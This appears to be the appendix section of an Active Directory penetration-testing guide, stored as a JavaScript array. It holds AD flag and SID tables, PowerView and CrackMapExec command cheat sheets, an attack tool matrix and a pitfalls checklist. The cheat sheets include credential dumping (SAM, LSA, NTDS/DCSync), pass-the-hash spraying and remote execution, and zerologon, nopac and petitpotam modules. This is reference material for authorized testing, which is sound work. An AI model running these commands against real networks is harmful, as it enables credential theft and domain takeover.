        content: "| Decimal | Flag |\n|---------|------|\n| 2 | ACCOUNTDISABLE |\n| 16 | LOCKOUT |\n| 32 | PASSWD_NOTREQD |\n| 64 | PASSWD_CANT_CHANGE |\n| 128 | ENCRYPTED_TEXT_PWD_ALLOWED (reversible) |\n| 512 | NORMAL_ACCOUNT |\n| 2048 | INTERDOMAIN_TRUST_ACCOUNT |\n| 4096 | WORKSTATION_TRUST_ACCOUNT |\n| 8192 | SERVER_TRUST_ACCOUNT |\n| 65536 | DONT_EXPIRE_PASSWORD |\n| 131072 | MNS_LOGON_ACCOUNT |\n| 262144 | SMARTCARD_REQUIRED |\n| 524288 | TRUSTED_FOR_DELEGATION (unconstrained) |\n| 1048576 | NOT_DELEGATED |\n| 2097152 | USE_DES_KEY_ONLY |\n| 4194304 | DONT_REQ_PREAUTH |\n| 8388608 | PASSWORD_EXPIRED |\n| 16777216 | TRUSTED_TO_AUTH_FOR_DELEGATION (constrained w/ protocol transition) |\n\n**LDAP filter:** `(userAccountControl:1.2.840.113556.1.4.803:=<DECIMAL>)` exact match."
      }
    ]
  },
  {
    id: "C",
    title: "Appendix C — Well-Known SIDs / RIDs",
    goal: "Reference for common Relative Identifiers (RIDs) and Security Identifiers (SIDs).",
    sections: [
      {
        title: "SIDs and RIDs Table",
        content: "| RID | Account/Group |\n|-----|---------------|\n| 500 | Built-in Administrator |\n| 501 | Guest |\n| 502 | krbtgt |\n| 512 | Domain Admins |\n| 513 | Domain Users |\n| 514 | Domain Guests |\n| 515 | Domain Computers |\n| 516 | Domain Controllers |\n| 517 | Cert Publishers |\n| 518 | Schema Admins |\n| 519 | Enterprise Admins |\n| 520 | Group Policy Creator Owners |\n| 525 | Protected Users |\n| 526 | Key Admins |\n| 527 | Enterprise Key Admins |\n| 553 | RAS and IAS Servers |\n| S-1-5-32-544 | BUILTIN\\\\Administrators |\n| S-1-5-32-551 | BUILTIN\\\\Backup Operators |\n| S-1-5-32-555 | BUILTIN\\\\Remote Desktop Users |\n| S-1-5-32-580 | BUILTIN\\\\Remote Management Users |"
      }
    ]
  },
  {
    id: "D",
    title: "Appendix D — Useful PowerView Cheats",
    goal: "Quick reference for common PowerView commands.",
    sections: [
      {
        title: "PowerView Commands",
        content: "```powershell\n# Domain-level\nGet-Domain\nGet-DomainController\nGet-DomainPolicy\nGet-DomainSID\nGet-DomainTrust / Get-DomainTrustMapping / Get-ForestTrust\nGet-DomainForeignUser / Get-DomainForeignGroupMember\n\n# Users / groups\nGet-DomainUser <user>\nGet-DomainUser -SPN\nGet-DomainUser -PreauthNotRequired\nGet-DomainUser -UACFilter PASSWD_NOTREQD\nGet-DomainUser -AdminCount\nGet-DomainUser -TrustedToAuth                    # constrained deleg targets\nGet-DomainUser -AllowDelegation                  # unconstrained\nGet-DomainGroupMember \"Domain Admins\" -Recurse\nGet-DomainGPO\n\n# Computers\nGet-DomainComputer\nGet-DomainComputer -Unconstrained\nGet-DomainComputer -TrustedToAuth\nGet-DomainFileServer\nGet-DomainDFSShare\n\n# ACL hunting\nFind-InterestingDomainAcl -ResolveGUIDs\nGet-DomainObjectACL -Identity <obj> -ResolveGUIDs\n\n# Sessions / local admin\nFind-LocalAdminAccess\nFind-DomainUserLocation -UserName <admin>\nGet-NetSession -ComputerName <host>\nGet-NetLocalGroupMember -ComputerName <host> -GroupName \"Remote Desktop Users\"\nGet-NetLocalGroupMember -ComputerName <host> -GroupName \"Remote Management Users\"\nGet-NetLocalGroupMember -ComputerName <host> -GroupName \"Administrators\"\n\n# Modification (be careful, document!)\nSet-DomainUserPassword -Identity <user> -AccountPassword $sec -Credential $cred\nSet-DomainObject -Identity <user> -SET @{<attr>=<val>} -Credential $cred\nSet-DomainObject -Identity <user> -Clear <attr> -Credential $cred\nAdd-DomainGroupMember -Identity <group> -Members <user> -Credential $cred\nRemove-DomainGroupMember -Identity <group> -Members <user> -Credential $cred\n```"
      }
    ]
  },
  {
    id: "E",
    title: "Appendix E — Useful CrackMapExec / NetExec Cheats",
    goal: "Quick reference for common CME/NetExec commands.",
    sections: [
      {
        title: "CrackMapExec Commands",
        content: "```bash\n# Local-admin spray (ALWAYS --local-auth!)\ncrackmapexec smb 10.10.0.0/24 -u administrator -H <HASH> --local-auth\n\n# Enumeration\ncrackmapexec smb <DC> -u u -p p --users\ncrackmapexec smb <DC> -u u -p p --groups\ncrackmapexec smb <DC> -u u -p p --pass-pol\ncrackmapexec smb <DC> -u u -p p --shares\ncrackmapexec smb <host> -u u -p p --loggedon-users\ncrackmapexec smb <host> -u u -p p --sessions\ncrackmapexec smb <host> -u u -p p --disks\ncrackmapexec smb <DC> -u u -p p --rid-brute 4000\n\n# Modules\ncrackmapexec smb -L                              # list modules\ncrackmapexec smb <DC> -u u -p p -M gpp_password\ncrackmapexec smb <DC> -u u -p p -M gpp_autologin\ncrackmapexec smb <DC> -u u -p p -M lsassy\ncrackmapexec smb <DC> -u u -p p -M nopac\ncrackmapexec smb <DC> -u u -p p -M zerologon\ncrackmapexec smb <DC> -u u -p p -M printerbug\ncrackmapexec smb <DC> -u u -p p -M petitpotam\n\n# Dumping\ncrackmapexec smb <host> -u administrator -H <HASH> --sam\ncrackmapexec smb <host> -u administrator -H <HASH> --lsa\ncrackmapexec smb <DC> -u administrator -H <HASH> --ntds        # DCSync if rights\n\n# Code exec\ncrackmapexec smb <host> -u administrator -H <HASH> -x 'whoami'\ncrackmapexec smb <host> -u administrator -H <HASH> -X 'whoami /priv' --exec-method wmiexec\n\n# Other protocols\ncrackmapexec winrm <host> -u u -p p\ncrackmapexec mssql <host> -u u -p p -q \"SELECT @@version\"\ncrackmapexec ssh <host> -u u -p p\ncrackmapexec ldap <host> -u u -p p --asreproast asrep.txt\ncrackmapexec ldap <host> -u u -p p --kerberoasting krb.txt\n```"
      }
    ]
  },
  {
    id: "F",
    title: "Appendix F — Quick Tool Selector",
    goal: "Reference matrix for choosing tools based on the attack requirement.",
    sections: [
      {
        title: "Tool Selection Matrix",
        content: "| Need | Linux | Windows |\n|------|-------|---------|\n| Username enum (no creds) | kerbrute, enum4linux-ng, rpcclient null | dsquery, net.exe |\n| Hash capture | Responder | Inveigh |\n| Password spray | kerbrute, CME, rpcclient loop | DomainPasswordSpray |\n| Build target list | linkedin2username + statistically-likely-usernames | same |\n| Domain map | bloodhound-python + smbmap + windapsearch | SharpHound + PowerView |\n| Kerberoast | GetUserSPNs.py | Rubeus |\n| ASREPRoast | GetNPUsers.py / kerbrute | Rubeus |\n| ACL abuse | bloodyAD, pth-net, targetedKerberoast.py | PowerView |\n| DCSync | secretsdump.py | mimikatz lsadump::dcsync |\n| Pass-the-Hash | impacket *exec.py, evil-winrm -H | mimikatz pth, evil-winrm |\n| Pass-the-Ticket | KRB5CCNAME + impacket -k | Rubeus ptt |\n| Lateral cmd exec | psexec.py / wmiexec.py | PsExec / Invoke-Command |\n| WinRM shell | evil-winrm | Enter-PSSession |\n| MSSQL | mssqlclient.py | PowerUpSQL |\n| Share secrets | smbmap, manual grep | Snaffler |\n| GPP decrypt | gpp-decrypt | Get-GPPPassword.ps1 |\n| Forge tickets | ticketer.py | mimikatz, Rubeus |\n| AD CS attacks | certipy | Certify.exe |\n| NoPac | noPac.py | noPac.exe ports exist |\n| PrintNightmare | CVE-2021-1675.py (cube0x0 impacket) | SharpPrintNightmare.exe |\n| PetitPotam | PetitPotam.py + ntlmrelayx.py + PKINITtools | Mimikatz misc::efs / Invoke-PetitPotam |\n| LDAP DNS dump | adidnsdump | manual ADSI |"
      }
    ]
  },
  {
    id: "G",
    title: "Appendix G — Common Engagement Pitfalls",
    goal: "Checklist of common mistakes to avoid during an engagement.",
    sections: [
      {
        title: "Pitfalls List",
        content: "1. **Account lockouts** during password spraying — always validate policy first; never spray without throttle.\n2. Running NoPac without checking → temporary computer account left in domain.\n3. Adding fake SPN for targeted Kerberoast → forgotten cleanup.\n4. Resetting a user's password → user can't log in next morning → angry helpdesk call. Always coordinate.\n5. Pulling NTDS without secure transport → NTLM hashes in flight to attack box, in tester's notes; encrypt at rest.\n6. Running SharpHound `-c All` against massive enterprise → enormous load + alarm noise. Use `--stealth` (DCOnly) for first pass.\n7. Forgetting `--local-auth` flag → local admin spray converts to domain spray → instant lockout storm.\n8. Cracking AS-REP with the wrong hashcat mode (18200 vs 19900) → hours wasted.\n9. Performing ACL/GPO changes that affect entire OUs of users/computers without checking impact scope first.\n10. PrintNightmare DLL crashes spooler on production server → printing outage. Test only with approval.\n11. Running raiseChild.py / \"autopwn\" tools blindly → if it fails midway, you don't understand what state was left behind.\n12. Forgetting the Kerberos Double Hop limitation → wasted time debugging \"credential\" errors on second hops.\n13. Passing `MachineAccountQuota=10` users → may add too many computer accounts and exhaust the quota."
      }
    ]
  },
  {
    id: "Z",
    title: "Final Iteration Reminder",
    goal: "The cyclical core of AD pentesting.",
    sections: [
      {
        title: "The Iteration Loop",
        content: "```\n                  ┌─────────────────────────────┐\n                  │ Got new credential / right? │\n                  └──────────────┬──────────────┘\n                                 │\n                                 ▼\n                  ┌─────────────────────────────┐\n                  │ Re-run Phase 4 enumeration  │\n                  │  AS THE NEW IDENTITY        │\n                  └──────────────┬──────────────┘\n                                 │\n                ┌────────────────┼────────────────┐\n                ▼                ▼                ▼\n        Phase 5 (privesc)  Phase 6 (lateral)  Phase 8 (trust)\n                │                │                │\n                └────────────────┼────────────────┘\n                                 ▼\n                  ┌─────────────────────────────┐\n                  │ Reach DA / EA / Forest root │\n                  │  → Phase 7 + Phase 10       │\n                  └─────────────────────────────┘\n```\n\n**Every credential is a new perspective. Every host is a new vantage. Loop, log, escalate.**"
      }
    ]
  }
];
